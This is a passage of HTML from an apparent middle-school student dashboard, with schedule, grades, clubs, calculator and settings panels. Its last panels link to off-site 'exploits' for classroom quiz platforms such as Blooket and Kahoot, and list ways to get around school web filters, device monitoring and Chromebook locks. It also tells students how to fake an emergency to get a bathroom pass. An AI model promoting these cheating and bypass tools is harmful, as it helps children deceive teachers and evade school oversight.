              <strong>Period 4:</strong> Social Studies - US History (Room 302)<br><small>Teacher: Mrs. Rodriguez - <a href="#" target="_blank">Class Page</a></small>
            </div>
            <div class="schedule-item">
              <strong>Period 5:</strong> Lunch & Recess (Cafeteria)<br><small>Time: 12:00 PM - 1:00 PM</small>
            </div>
            <div class="schedule-item">
              <strong>Period 6:</strong> Art & Design (Art Studio)<br><small>Teacher: Ms. Lee - <a href="#" target="_blank">Class Page</a></small>
            </div>
            <div class="schedule-item">
              <strong>Period 7:</strong> Physical Education (Gymnasium)<br><small>Teacher: Coach Miller - <a href="#" target="_blank">Class Page</a></small>
            </div>
            <div class="schedule-item">
              <strong>Period 8:</strong> Elective - Computer Science (Computer Lab 2)<br><small>Teacher: Mr. Gupta - <a href="#" target="_blank">Class Page</a></small>
            </div>
            <div class="schedule-item">
              <strong>Study Hall:</strong> (Library)<br><small>Supervisor: Mr. Johnson</small>
            </div>
            <div class="schedule-item">
              <strong>Homeroom:</strong> (Room 205)<br><small>Advisor: Ms. Davis</small>
            </div>
            <div class="schedule-item">
              <strong>Virtual Meeting Links:</strong><br><small><a href="https://meet.google.com/math-davis" target="_blank">Math Meet</a> | <a href="https://zoom.us/j/english-thompson" target="_blank">English Zoom</a></small>
            </div>
            <div class="schedule-item">
              <strong>Next Day's Schedule:</strong><br><small>Check for any changes or special events.</small>
            </div>
          </div>
        </div>
      </div>

      <!-- Grades Panel -->
      <div id="gradesPanel" class="info-panel">
        <h2>üíØ Grades Viewer</h2>
        <h3>Your Current Grades Overview</h3>
        <div id="gradesContent" class="grades-content active-content">
          <p>Here you can view your current grades for all subjects. Grades are updated weekly.</p>
          <div class="list-grid-2">
            <div class="grade-entry">
              <strong>Math:</strong> A- (91%)<br><small>Last Updated: 2024-04-20</small>
            </div>
            <div class="grade-entry">
              <strong>English Language Arts:</strong> B+ (88%)<br><small>Last Updated: 2024-04-18</small>
            </div>
            <div class="grade-entry">
              <strong>Science:</strong> A (95%)<br><small>Last Updated: 2024-04-19</small>
            </div>
            <div class="grade-entry">
              <strong>Social Studies:</strong> B (85%)<br><small>Last Updated: 2024-04-17</small>
            </div>
            <div class="grade-entry">
              <strong>Art & Design:</strong> A+ (98%)<br><small>Last Updated: 2024-04-15</small>
            </div>
            <div class="grade-entry">
              <strong>Physical Education:</strong> A (93%)<br><small>Last Updated: 2024-04-21</small>
            </div>
            <div class="grade-entry">
              <strong>Computer Science:</strong> A (92%)<br><small>Last Updated: 2024-04-20</small>
            </div>
            <div class="grade-entry">
              <strong>Overall GPA:</strong> 3.75<br><small>Based on current semester grades.</small>
            </div>
          </div>
        </div>
      </div>

      <!-- Assignments Panel -->
      <div id="assignmentsPanel" class="info-panel">
        <h2>üìñ Assignments & Due Dates</h2>
        <h3>Upcoming Assignments and Projects</h3>
        <div id="assignmentsContent" class="assignments-content active-content">
          <p>Keep track of all your homework and project due dates here.</p>
          <div class="list-grid-2">
            <div class="update-entry">
              <strong>Math:</strong> Algebra Worksheet - Due: 2024-04-26<br><small>Status: Not Started</small>
            </div>
            <div class="update-entry">
              <strong>English:</strong> Essay Draft - Due: 2024-04-29<br><small>Status: In Progress</small>
            </div>
            <div class="update-entry">
              <strong>Science:</strong> Lab Report (Photosynthesis) - Due: 2024-05-03<br><small>Status: Completed</small>
            </div>
            <div class="update-entry">
              <strong>Social Studies:</strong> Research Project Presentation - Due: 2024-05-10<br><small>Status: Not Started</small>
            </div>
            <div class="update-entry">
              <strong>Art:</strong> Sketchbook Assignment - Due: 2024-04-28<br><small>Status: In Progress</small>
            </div>
            <div class="update-entry">
              <strong>Computer Science:</strong> Coding Challenge 3 - Due: 2024-05-01<br><small>Status: Not Started</small>
            </div>
            <div class="update-entry">
              <strong>PE:</strong> Fitness Log - Due: Every Friday<br><small>Status: Ongoing</small>
            </div>
            <div class="update-entry">
              <strong>Elective:</strong> Debate Prep - Due: 2024-05-05<br><small>Status: In Progress</small>
            </div>
            <div class="update-entry">
              <strong>Math:</strong> Chapter 5 Review - Due: 2024-05-02<br><small>Status: Not Started</small>
            </div>
            <div class="update-entry">
              <strong>English:</strong> Novel Reading (Chapters 5-8) - Due: 2024-05-01<br><small>Status: In Progress</small>
            </div>
          </div>
        </div>
      </div>

      <!-- Study Resources Panel -->
      <div id="studyResourcesPanel" class="info-panel">
        <h2>üß† Study Resources</h2>
        <h3>Tools and Materials to Aid Your Learning</h3>
        <div id="studyResourcesContent" class="study-resources-content active-content">
          <p>Access a variety of resources to help you study and succeed.</p>
          <div class="list-grid-2">
            <a href="https://www.khanacademy.org" target="_blank" class="resource-item">Khan Academy</a>
            <a href="https://quizlet.com" target="_blank" class="resource-item">Quizlet</a>
            <a href="https://www.duolingo.com" target="_blank" class="resource-item">Duolingo</a>
            <a href="https://www.mathway.com" target="_blank" class="resource-item">Mathway</a>
            <a href="https://www.grammarly.com" target="_blank" class="resource-item">Grammarly</a>
            <a href="https://www.google.com/scholar" target="_blank" class="resource-item">Google Scholar</a>
            <div class="resource-item">
              <strong>Local Notes Storage:</strong><br><small>Access your saved notes from the Notes Canvas here.</small>
            </div>
            <div class="resource-item">
              <strong>Virtual Flashcards:</strong><br><small>Create and review digital flashcards.</small>
            </div>
            <div class="resource-item">
              <strong>Subject-specific Tutors:</strong><br><small>Request peer or faculty tutoring sessions.</small>
            </div>
            <div class="resource-item">
              <strong>Research Databases:</strong><br><small>Links to school-approved research databases.</small>
            </div>
          </div>
        </div>
      </div>

      <!-- Course Catalog Panel -->
      <div id="courseCatalogPanel" class="info-panel">
        <h2>üìë Course Catalog</h2>
        <h3>Explore Available Courses</h3>
        <div id="courseCatalogContent" class="course-catalog-content active-content">
          <p>Browse detailed descriptions of all courses offered at Middletown Area Middle School.</p>
          <div class="list-grid-2">
            <div class="course-item">
              <strong>6th Grade Math:</strong> Foundations of Arithmetic and Pre-Algebra.
            </div>
            <div class="course-item">
              <strong>7th Grade ELA:</strong> Advanced Reading Comprehension and Essay Writing.
            </div>
            <div class="course-item">
              <strong>8th Grade Science:</strong> Earth Science and Astronomy.
            </div>
            <div class="course-item">
              <strong>6th Grade Social Studies:</strong> Ancient Civilizations.
            </div>
            <div class="course-item">
              <strong>7th Grade Art:</strong> Introduction to Digital Art and Sculpture.
            </div>
            <div class="course-item">
              <strong>8th Grade Music:</strong> Band, Chorus, and Music Theory.
            </div>
            <div class="course-item">
              <strong>Elective: Coding Basics:</strong> Learn Python and JavaScript fundamentals.
            </div>
            <div class="course-item">
              <strong>Elective: Robotics Club:</strong> Design and build autonomous robots.
            </div>
            <div class="course-item">
              <strong>Elective: Public Speaking:</strong> Develop confidence in oral presentations.
            </div>
            <div class="course-item">
              <strong>Elective: Creative Writing:</strong> Explore various genres and develop storytelling skills.
            </div>
            <div class="course-item">
              <strong>Elective: Photography:</strong> Fundamentals of digital photography and editing.
            </div>
            <div class="course-item">
              <strong>Elective: Spanish I:</strong> Introduction to basic Spanish language and culture.
            </div>
          </div>
        </div>
      </div>

      <!-- Attendance Panel -->
      <div id="attendancePanel" class="info-panel">
        <h2> ÿ≠ÿ∂Ÿàÿ± Ÿà ÿ∫€åÿßÿ® Attendance </h2>
        <h3>Your Attendance Records</h3>
        <div id="attendanceContent" class="attendance-content active-content">
          <p>Review your attendance history for the current semester.</p>
          <div class="list-grid-2">
            <div class="attendance-entry">
              <strong>Date:</strong> 2024-04-15 | <strong>Status:</strong> Present (All periods)
            </div>
            <div class="attendance-entry">
              <strong>Date:</strong> 2024-04-16 | <strong>Status:</strong> Tardy (Period 1)
            </div>
            <div class="attendance-entry">
              <strong>Date:</strong> 2024-04-17 | <strong>Status:</strong> Present (All periods)
            </div>
            <div class="attendance-entry">
              <strong>Date:</strong> 2024-04-18 | <strong>Status:</strong> Absent (Excused - Doctor's note)
            </div>
            <div class="attendance-entry">
              <strong>Date:</strong> 2024-04-19 | <strong>Status:</strong> Present (All periods)
            </div>
            <div class="attendance-entry">
              <strong>Date:</strong> 2024-04-22 | <strong>Status:</strong> Present (All periods)
            </div>
            <div class="attendance-entry">
              <strong>Date:</strong> 2024-04-23 | <strong>Status:</strong> Present (All periods)
            </div>
            <div class="attendance-entry">
              <strong>Total Absences:</strong> 1 (Excused) | <strong>Total Tardies:</strong> 1
            </div>
          </div>
        </div>
      </div>

      <!-- Clubs & Activities Panel -->
      <div id="clubsActivitiesPanel" class="info-panel">
        <h2>ü§ù Clubs & Activities</h2>
        <h3>Explore Student Clubs and Organizations</h3>
        <div id="clubActivityContent" class="club-activity-content active-content">
          <p>Get involved! Find a club that interests you and learn how to join.</p>
          <div class="list-grid-2">
            <div class="club-item">
              <strong>Science Club:</strong> Explore experiments and scientific principles.<br><small>Advisor: Dr. Chen | Meetings: Tuesdays, 3:15 PM, Lab 1</small>
            </div>
            <div class="club-item">
              <strong>Chess Club:</strong> Develop strategy and compete.<br><small>Advisor: Mr. Thompson | Meetings: Thursdays, 3:30 PM, Library</small>
            </div>
            <div class="club-item">
              <strong>Art Club:</strong> Creative projects and exhibitions.<br><small>Advisor: Ms. Lee | Meetings: Mondays, 3:15 PM, Art Studio</small>
            </div>
            <div class="club-item">
              <strong>Debate Club:</strong> Improve public speaking and argumentation skills.<br><small>Advisor: Mrs. Rodriguez | Meetings: Wednesdays, 3:45 PM, Room 302</small>
            </div>
            <div class="club-item">
              <strong>Robotics Club:</strong> Design, build, and program robots.<br><small>Advisor: Mr. Gupta | Meetings: Fridays, 3:30 PM, Computer Lab 2</small>
            </div>
            <div class="club-item">
              <strong>Yearbook Committee:</strong> Document school memories.<br><small>Advisor: Ms. Davis | Meetings: Bi-weekly, Tuesdays, Room 205</small>
            </div>
            <div class="club-item">
              <strong>Environmental Club:</strong> Promote sustainability and green initiatives.<br><small>Advisor: Ms. Miller | Meetings: 1st & 3rd Wednesday, 3:15 PM, School Garden</small>
            </div>
            <div class="club-item">
              <strong>Coding Club:</strong> Learn programming languages and develop apps.<br><small>Advisor: Mr. Gupta | Meetings: Tuesdays, 4:00 PM, Computer Lab 1</small>
            </div>
            <div class="club-item">
              <strong>Reading Club:</strong> Discuss books and authors.<br><small>Advisor: Ms. Sanchez | Meetings: Monthly, 3:15 PM, Library</small>
            </div>
            <div class="club-item">
              <strong>Gaming Club:</strong> Casual gaming and esports.<br><small>Advisor: Mr. Patel | Meetings: Fridays, 3:00 PM, Flex Space</small>
            </div>
          </div>
        </div>
      </div>

      <!-- Sports Teams Panel -->
      <div id="sportsTeamsPanel" class="info-panel">
        <h2>‚öΩ Sports Teams</h2>
        <h3>School Athletic Programs</h3>
        <div id="sportsContent" class="sports-content active-content">
          <p>View information about our competitive sports teams, schedules, and coaches.</p>
          <div class="list-grid-2">
            <div class="club-item">
              <strong>Basketball (Boys):</strong> Winter Season<br><small>Coach: Coach Jones | <a href="#" target="_blank">Schedule</a> | <a href="#" target="_blank">Roster</a></small>
            </div>
            <div class="club-item">
              <strong>Basketball (Girls):</strong> Winter Season<br><small>Coach: Coach Smith | <a href="#" target="_blank">Schedule</a> | <a href="#" target="_blank">Roster</a></small>
            </div>
            <div class="club-item">
              <strong>Soccer (Co-ed):</strong> Fall Season<br><small>Coach: Coach Garcia | <a href="#" target="_blank">Schedule</a> | <a href="#" target="_blank">Roster</a></small>
            </div>
            <div class="club-item">
              <strong>Track & Field (Co-ed):</strong> Spring Season<br><small>Coach: Coach Brown | <a href="#" target="_blank">Schedule</a> | <a href="#" target="_blank">Roster</a></small>
            </div>
            <div class="club-item">
              <strong>Volleyball (Girls):</strong> Fall Season<br><small>Coach: Coach White | <a href="#" target="_blank">Schedule</a> | <a href="#" target="_blank">Roster</a></small>
            </div>
            <div class="club-item">
              <strong>Cross Country (Co-ed):</strong> Fall Season<br><small>Coach: Coach Green | <a href="#" target="_blank">Schedule</a> | <a href="#" target="_blank">Roster</a></small>
            </div>
            <div class="club-item">
              <strong>Wrestling (Boys):</strong> Winter Season<br><small>Coach: Coach Black | <a href="#" target="_blank">Schedule</a> | <a href="#" target="_blank">Roster</a></small>
            </div>
            <div class="club-item">
              <strong>Tennis (Co-ed):</strong> Spring Season<br><small>Coach: Coach Blue | <a href="#" target="_blank">Schedule</a> | <a href="#" target="_blank">Roster</a></small>
            </div>
          </div>
        </div>
      </div>

      <!-- School Events Panel -->
      <div id="schoolEventsPanel" class="info-panel">
        <h2>üóìÔ∏è School Events Calendar</h2>
        <h3>Important Dates and Upcoming School Events</h3>
        <div id="schoolEventsContent" class="school-events-content active-content">
          <p>Stay informed about all school-wide events, holidays, and important deadlines.</p>
          <div class="list-grid-2">
            <div class="event-item">
              <strong>2024-04-26:</strong> School Spirit Day - Wear School Colors!
            </div>
            <div class="event-item">
              <strong>2024-04-29:</strong> Parent-Teacher Conferences (Evening)
            </div>
            <div class="event-item">
              <strong>2024-05-03:</strong> Middle School Dance (Gymnasium)
            </div>
            <div class="event-item">
              <strong>2024-05-10:</strong> Spring Concert (Auditorium)
            </div>
            <div class="event-item">
              <strong>2024-05-17:</strong> Field Day! (Outdoor Fields)
            </div>
            <div class="event-item">
              <strong>2024-05-27:</strong> Memorial Day - No School
            </div>
            <div class="event-item">
              <strong>2024-06-05:</strong> 8th Grade Graduation Ceremony
            </div>
            <div class="event-item">
              <strong>2024-06-07:</strong> Last Day of School (Early Dismissal)
            </div>
            <div class="event-item">
              <strong>2024-08-26:</strong> First Day of School (2024-2025)
            </div>
            <div class="event-item">
              <strong>2024-09-02:</strong> Labor Day - No School
            </div>
          </div>
        </div>
      </div>

      <!-- News & Announcements Panel -->
      <div id="newsAnnouncementsPanel" class="info-panel">
        <h2>üì¢ News & Announcements</h2>
        <h3>Detailed School News and Important Alerts</h3>
        <div id="newsContent" class="news-content active-content">
          <p>Beyond the scrolling bar, find more in-depth information here.</p>
          <div class="list-grid-1">
            <div class="news-item">
              <strong>April 23, 2024:</strong> <br> Our school robotics team, the "RaiderBots," advanced to the regional championships! Congratulations to all team members and their advisor, Mr. Gupta, for their hard work and dedication.
            </div>
            <div class="news-item">
              <strong>April 20, 2024:</strong> <br> Reminder: The deadline for submitting artwork for the Spring Art Show is this Friday, April 26th. Please see Ms. Lee in the Art Studio for submission details.
            </div>
            <div class="news-item">
              <strong>April 18, 2024:</strong> <br> The Middletown Area School District is hosting a blood drive on May 1st. Students aged 16 and older can participate with parental consent. See the main office for consent forms.
            </div>
            <div class="news-item">
              <strong>April 15, 2024:</strong> <br> The library will be closed for inventory on April 24th and 25th. Please plan your book returns and checkouts accordingly.
            </div>
            <div class="news-item">
              <strong>April 10, 2024:</strong> <br> We are excited to announce new additions to our school's athletic department, including new equipment for the weight room and updated training facilities. Go Raiders!
            </div>
          </div>
        </div>
      </div>

      <!-- Counseling Services Panel -->
      <div id="counselingServicesPanel" class="info-panel">
        <h2>üéóÔ∏è Counseling Services</h2>
        <h3>Support for Academic, Career, and Personal Needs</h3>
        <div id="counselingContent" class="counseling-content active-content">
          <p>Our counseling department is here to support students in various aspects of their school life and personal development.</p>
          <div class="list-grid-2">
            <div class="counseling-item">
              <strong>Academic Advising:</strong> Course selection, study skills, academic planning.<br><small>Contact: Ms. Jenkins (Guidance Counselor)</small>
            </div>
            <div class="counseling-item">
              <strong>Career Exploration:</strong> Interest assessments, career paths, future planning.<br><small>Contact: Mr. Davis (Career Counselor)</small>
            </div>
            <div class="counseling-item">
              <strong>Personal & Social Support:</strong> Conflict resolution, stress management, mental health resources.<br><small>Contact: Ms. Green (School Psychologist)</small>
            </div>
            <div class="counseling-item">
              <strong>Crisis Intervention:</strong> Immediate support for urgent situations.<br><small>Contact: Main Office or any Staff Member immediately</small>
            </div>
            <div class="counseling-item">
              <strong>Referral Services:</strong> Connections to external community resources.<br><small>Contact: Guidance Office</small>
            </div>
            <div class="counseling-item">
              <strong>College Preparation:</strong> Application assistance, scholarship information.<br><small>Contact: Mr. Davis (Career Counselor)</small>
            </div>
          </div>
          <h3>Helpful Resources</h3>
          <div class="links-list list-grid-2">
            <a href="https://www.apa.org/helpcenter" target="_blank">APA Help Center (Mental Health)</a>
            <a href="https://www.scholastic.com/parents/books-and-reading/reading-resources.html" target="_blank">Scholastic Reading Resources</a>
            <a href="https://www.stopbullying.gov" target="_blank">Stop Bullying (Official Site)</a>
            <a href="https://www.nami.org/find-support" target="_blank">NAMI (Mental Health)</a>
          </div>
        </div>
      </div>

      <!-- Discipline Records Panel -->
      <div id="disciplineRecordsPanel" class="info-panel">
        <h2> üö® Discipline Records </h2>
        <h3>Your Discipline History (Simulated)</h3>
        <div id="disciplineContent" class="discipline-content active-content">
          <p>This section provides a simulated overview of your discipline records. Actual records are maintained by the school administration.</p>
          <div class="list-grid-1">
            <div class="discipline-entry">
              <strong>Date:</strong> 2024-03-10 | <strong>Incident:</strong> Minor classroom disruption<br><small><strong>Action:</strong> Verbal warning from teacher.</small>
            </div>
            <div class="discipline-entry">
              <strong>Date:</strong> 2024-02-20 | <strong>Incident:</strong> Late to class without pass (3rd instance)<br><small><strong>Action:</strong> 15-minute detention.</small>
            </div>
            <div class="discipline-entry">
              <strong>Date:</strong> 2024-01-05 | <strong>Incident:</strong> Violation of phone policy<br><small><strong>Action:</strong> Phone confiscated for the day, returned to parent.</small>
            </div>
            <div class="discipline-entry">
              <strong>Date:</strong> 2023-11-15 | <strong>Incident:</strong> Dress code violation<br><small><strong>Action:</strong> Change of clothes required, warning issued.</small>
            </div>
          </div>
          <div class="info-text">
            <p><strong>Note:</strong> Repeated or severe infractions may lead to more serious consequences, including in-school suspension, out-of-school suspension, or expulsion. Please refer to the Student Handbook for full disciplinary policies.</p>
          </div>
        </div>
      </div>


      <!-- Reminder System Panel -->
      <div id="reminderPanel" class="info-panel">
        <h2>üîî Reminder System</h2>
        <h3>Manage Your Personal Reminders</h3>
        <div class="reminder-form">
          <label for="reminderText">Reminder Description:</label>
          <input type="text" id="reminderText" placeholder="e.g., Math homework due" required />
          
          <label for="reminderDateTime">Date and Time:</label>
          <input type="datetime-local" id="reminderDateTime" required />

          <label for="reminderPriority">Priority:</label>
          <select id="reminderPriority">
            <option value="low">Low</option>
            <option value="medium" selected>Medium</option>
            <option value="high">High</option>
          </select>
          
          <button id="addReminderBtn">Add Reminder</button>
        </div>
        
        <h3>Upcoming Reminders</h3>
        <div id="reminderList" class="reminder-list active-content">
          <!-- Reminders will be dynamically loaded here -->
          <p>No reminders set yet. Use the form above to add one!</p>
        </div>
      </div>

      <!-- Task Manager Panel -->
      <div id="taskManagerPanel" class="info-panel">
        <h2>‚úÖ Task Manager</h2>
        <h3>Organize Your Daily Tasks</h3>
        <div class="reminder-form"> <!-- Re-using form styling for consistency -->
          <label for="taskText">New Task:</label>
          <input type="text" id="taskText" placeholder="e.g., Finish English essay" required />
          <button id="addTaskBtn">Add Task</button>
        </div>
        <h3>My Tasks</h3>
        <div id="taskList" class="task-list active-content">
          <!-- Tasks will be dynamically loaded here -->
          <p>No tasks added yet. Get started by adding one!</p>
        </div>
      </div>

      <!-- Pomodoro Timer Panel -->
      <div id="pomodoroPanel" class="info-panel">
        <h2>üçÖ Pomodoro Timer</h2>
        <h3>Focus with the Pomodoro Technique</h3>
        <div class="pomodoro-timer-display" id="pomodoroDisplay">25:00</div>
        <div class="pomodoro-controls">
          <button id="pomodoroStartBtn" class="start">Start</button>
          <button id="pomodoroPauseBtn">Pause</button>
          <button id="pomodoroResetBtn" class="reset">Reset</button>
        </div>
        <div class="info-text" style="margin-top: 20px;">
          <p>The Pomodoro Technique is a time management method that uses a timer to break down work into intervals, traditionally 25 minutes in length, separated by short breaks. Each interval is known as a pomodoro.</p>
          <ul>
            <li><strong>Work Period:</strong> 25 minutes</li>
            <li><strong>Short Break:</strong> 5 minutes</li>
            <li><strong>Long Break:</strong> 15-30 minutes (after 4 pomodoros)</li>
          </ul>
        </div>
      </div>

      <!-- Calculator Panel -->
      <div id="calculatorPanel" class="info-panel">
        <h2>üßÆ Calculator</h2>
        <h3>Basic Arithmetic Calculator</h3>
        <div id="calculatorDisplay">0</div>
        <div class="calculator-grid">
          <button class="clear">C</button>
          <button class="operator">+/-</button>
          <button class="operator">%</button>
          <button class="operator">/</button>

          <button>7</button>
          <button>8</button>
          <button>9</button>
          <button class="operator">*</button>

          <button>4</button>
          <button>5</button>
          <button>6</button>
          <button class="operator">-</button>

          <button>1</button>
          <button>2</button>
          <button>3</button>
          <button class="operator">+</button>

          <button class="span-2">0</button>
          <button>.</button>
          <button class="equals">=</button>
        </div>
      </div>

      <!-- Unit Converter Panel -->
      <div id="unitConverterPanel" class="info-panel">
        <h2>üìè Unit Converter</h2>
        <h3>Convert Between Different Units</h3>
        <div class="unit-converter-controls">
          <input type="number" id="convertValue" value="1" placeholder="Enter value" />
          <select id="convertFromUnit">
            <option value="cm">Centimeters</option>
            <option value="m">Meters</option>
            <option value="km">Kilometers</option>
            <option value="inch">Inches</option>
            <option value="ft">Feet</option>
            <option value="mi">Miles</option>
          </select>
          <span>to</span>
          <select id="convertToUnit">
            <option value="m">Meters</option>
            <option value="cm">Centimeters</option>
            <option value="km">Kilometers</option>
            <option value="ft">Feet</option>
            <option value="inch">Inches</option>
            <option value="mi">Miles</option>
          </select>
          <button id="convertBtn">Convert</button>
        </div>
        <div id="unitConverterOutput" class="unit-converter-output active-content">
          Result: 1 meter = 100 centimeters
        </div>
      </div>

      <!-- Virtual Assistant Panel -->
      <div id="virtualAssistantPanel" class="info-panel">
        <h2>ü§ñ Virtual Assistant</h2>
        <h3>Your Personal Dashboard Helper</h3>
        <div id="virtualAssistantOutput" class="virtual-assistant-content active-content">
          Welcome! Type 'help' to see available commands.
        </div>
        <input type="text" id="virtualAssistantInput" placeholder="Type your command here..." />
      </div>

      <!-- Maintenance Requests Panel -->
      <div id="maintenanceRequestsPanel" class="info-panel">
        <h2>üîß Maintenance Request</h2>
        <h3>Submit a Request for Repairs or Maintenance</h3>
        <div id="maintenanceContent" class="maintenance-content active-content">
          <p>Use this form to report any issues with school facilities or equipment.</p>
          <div class="reminder-form">
            <label for="maintenanceLocation">Location:</label>
            <input type="text" id="maintenanceLocation" placeholder="e.g., Room 205, broken chair" required />
            <label for="maintenanceIssue">Issue Description:</label>
            <textarea id="maintenanceIssue" rows="4" placeholder="Describe the problem in detail..."></textarea>
            <button id="submitMaintenanceBtn">Submit Request</button>
          </div>
          <h3>Your Recent Requests (Simulated)</h3>
          <div class="list-grid-1">
            <div class="maintenance-item">
              <strong>Request ID:</strong> #00123 | <strong>Issue:</strong> Leaky faucet in boys' restroom (1st floor)<br><small><strong>Status:</strong> In Progress | <strong>Submitted:</strong> 2024-04-10</small>
            </div>
            <div class="maintenance-item">
              <strong>Request ID:</strong> #00122 | <strong>Issue:</strong> Projector bulb burnt out in Room 305<br><small><strong>Status:</strong> Completed | <strong>Submitted:</strong> 2024-04-05</small>
            </div>
            <div class="maintenance-item">
              <strong>Request ID:</strong> #00121 | <strong>Issue:</strong> Broken window in gymnasium<br><small><strong>Status:</strong> Pending Review | <strong>Submitted:</strong> 2024-03-28</small>
            </div>
          </div>
        </div>
      </div>

      <!-- IT Support Panel -->
      <div id="itSupportPanel" class="info-panel">
        <h2>üíª IT Support</h2>
        <h3>Get Technical Assistance</h3>
        <div id="itSupportContent" class="it-support-content active-content">
          <p>For any technical issues with devices, software, or network connectivity, please reach out to IT support.</p>
          <h3>Common Issues & Troubleshooting</h3>
          <div class="list-grid-2">
            <div class="it-support-item">
              <strong>Can't connect to WiFi?</strong><br><small>Ensure 'Middletown_Core' is selected. Forget network and reconnect. Contact IT if issue persists.</small>
            </div>
            <div class="it-support-item">
              <strong>iPad frozen?</strong><br><small>Perform a force restart (Volume Up then Volume Down, then hold Power button).</small>
            </div>
            <div class="it-support-item">
              <strong>Password reset for school accounts?</strong><br><small>Contact the main office during school hours or submit a ticket below.</small>
            </div>
            <div class="it-support-item">
              <strong>Software not launching?</strong><br><small>Ensure app is updated. Restart your device. Reinstall if necessary.</small>
            </div>
          </div>
          <h3>Submit an IT Ticket</h3>
          <div class="reminder-form">
            <label for="itIssueCategory">Category:</label>
            <select id="itIssueCategory">
              <option value="wifi">WiFi / Network</option>
              <option value="device">Device Hardware (iPad, Laptop)</option>
              <option value="software">Software / Application</option>
              <option value="account">Account / Password</option>
              <option value="printer">Printer / Peripherals</option>
              <option value="other">Other</option>
            </select>
            <label for="itIssueDescription">Issue Description:</label>
            <textarea id="itIssueDescription" rows="4" placeholder="Describe your technical problem..."></textarea>
            <button id="submitItTicketBtn">Submit IT Ticket</button>
          </div>
        </div>
      </div>

      <!-- Profile Settings Panel -->
      <div id="profileSettingsPanel" class="info-panel">
        <h2>üë§ Profile Settings</h2>
        <h3>Manage Your Account Information</h3>
        <div id="profileSettingsContent" class="profile-settings-content active-content">
          <p>Update your personal information and preferences.</p>
          <label for="settingUsername">Username:</label>
          <input type="text" id="settingUsername" value="Beta.user" disabled />
          <p><small>Username cannot be changed.</small></p>

          <label for="settingPassword">New Password:</label>
          <input type="password" id="settingPassword" placeholder="Enter new password" />
          <label for="settingConfirmPassword">Confirm New Password:</label>
          <input type="password" id="settingConfirmPassword" placeholder="Confirm new password" />
          <button id="updatePasswordBtn">Update Password (Simulated)</button>
          <p><small style="color: var(--error-color);">Note: Password changes are simulated and do not affect actual login credentials.</small></p>

          <label for="settingEmail">Contact Email:</label>
          <input type="email" id="settingEmail" value="beta.user@raiderweb.org" placeholder="Enter your contact email" />
          <button id="updateEmailBtn">Update Email (Simulated)</button>
        </div>
      </div>

      <!-- Dashboard Customization Panel -->
      <div id="dashboardCustomizationPanel" class="info-panel">
        <h2>üé® Dashboard Customization</h2>
        <h3>Personalize Your Dashboard Experience</h3>
        <div id="dashboardCustomizationContent" class="dashboard-customization-content active-content">
          <p>Choose your preferred theme and layout settings.</p>

          <h3>Theme Selection</h3>
          <div class="theme-options-grid">
            <div class="theme-option" id="themeDefaultOption">
              <button id="defaultThemeBtn">Default (Dark)</button>
            </div>
            <div class="theme-option" id="themeLightOption">
              <button id="lightThemeBtn">Light Mode</button>
            </div>
            <div class="theme-option" id="themeBlueOption">
              <button id="blueThemeBtn">Blue Accent</button>
            </div>
            <div class="theme-option" id="themeGreenOption">
              <button id="greenThemeBtn">Green Accent</button>
            </div>
            <div class="theme-option" id="themeRedOption">
              <button id="redThemeBtn">Red Accent</button>
            </div>
            <div class="theme-option" id="themePurpleOption">
              <button id="purpleThemeBtn">Purple Accent</button>
            </div>
          </div>
          <p style="margin-top: 20px;"><small>Currently active theme: <span id="activeThemeDisplay">Default (Dark)</span></small></p>

          <h3>Dashboard Layout</h3>
          <label for="layoutPreference">Main Grid Layout:</label>
          <select id="layoutPreference">
            <option value="default">Default (Flex Row)</option>
            <option value="grid2col">2 Columns Grid</option>
            <option value="grid1col">1 Column Stack</option>
          </select>
          <button id="applyLayoutBtn">Apply Layout (Simulated)</button>
          <p style="margin-top: 15px;"><small>Layout changes are simulated and may require page refresh for full effect.</small></p>
        </div>
      </div>

      <!-- Exploit Panel -->
      <div id="exploitPanel" class="info-panel">
        <h2>üß® Exploiting Tools</h2>
        <h3>Unsanctioned Tools for Educational Platforms (Use with Caution)</h3>
        <div class="exploit-buttons list-grid-4">
          <a href="https://sites.google.com/view/tools-2/blooket-exploit" target="_blank">Blooket Exploit</a>
          <a href="https://sites.google.com/view/tools-2/blooket-exploit" target="_blank">Kahoot Exploit</a>
          <a href="https://sites.google.com/view/tools-2/blooket-exploit" target="_blank">Gimkit Exploit</a>
          <a href="https://sites.google.com/view/tools-2/blooket-exploit" target="_blank">Quizlet Exploit</a>
          <a href="https://sites.google.com/view/tools-2/blooket-exploit" target="_blank">Quizzes Exploit</a>
          <a href="https://sites.google.com/view/tools-2/blooket-exploit" target="_blank">Quills Exploit</a>
          <a href="https://sites.google.com/view/tools-2/blooket-exploit" target="_blank">Edpuzzle Exploit</a>
          <a href="https://sites.google.com/view/tools-2/blooket-exploit" target="_blank">Nearpod Exploit</a>
          <a href="https://sites.google.com/view/tools-2/blooket-exploit" target="_blank">Prodigy Exploit</a>
          <a href="https://sites.google.com/view/tools-2/blooket-exploit" target="_blank">Desmos Exploit</a>
          <a href="https://sites.google.com/view/tools-2/blooket-exploit" target="_blank">IXL Exploit</a>
          <a href="https://sites.google.com/view/tools-2/blooket-exploit" target="_blank">BrainPop Exploit</a>
        </div>
        <div class="info-text" style="color: var(--error-color);">
          <p><strong>Warning:</strong> These tools are provided for informational purposes only. Using them to gain an unfair advantage or disrupt educational platforms may violate school policy and could result in severe disciplinary actions, including suspension or expulsion. Exercise extreme caution.</p>
        </div>
      </div>

      <!-- Bypass Panel -->
      <div id="bypassPanel" class="info-panel">
        <h2>üö™ Bypassing Tools</h2>
        <h3>Methods to Bypass School Restrictions (Use with Extreme Caution)</h3>
        <div class="bypass-buttons list-grid-3">
          <button onclick="dashboard.showBypassContent('bathroom')">Bathroom Bypass</button>
          <button onclick="dashboard.showBypassContent('wifi')">Wifi Bypass</button>
          <button onclick="dashboard.showBypassContent('monitoring')">Teacher Monitoring Bypass</button>
          <button onclick="dashboard.showBypassContent('chromebook')">Chromebook Bypass</button>
          <button onclick="dashboard.showBypassContent('webfilter')">Web Filter Bypass</button>
          <button onclick="dashboard.showBypassContent('screenlock')">Screen Lock Bypass</button>
        </div>
        
        <div id="bathroomBypass" class="bypass-content active-content">
          <h3>Bathroom Pass Bypass (Simulated)</h3>
          <p><strong>Method 1: The "Emergency" Act</strong></p>
          <p>Feigning an urgent need for the restroom, often combined with a sudden exit or distressed expression, can sometimes bypass a strict teacher. Use sparingly to maintain credibility.</p>
          <p><strong>Method 2: Group Movement (Distraction)</strong></p>
          <p>If another student is permitted to go, subtly join them or ask immediately after, hoping the teacher will grant permission without much thought due to the existing flow.</p>
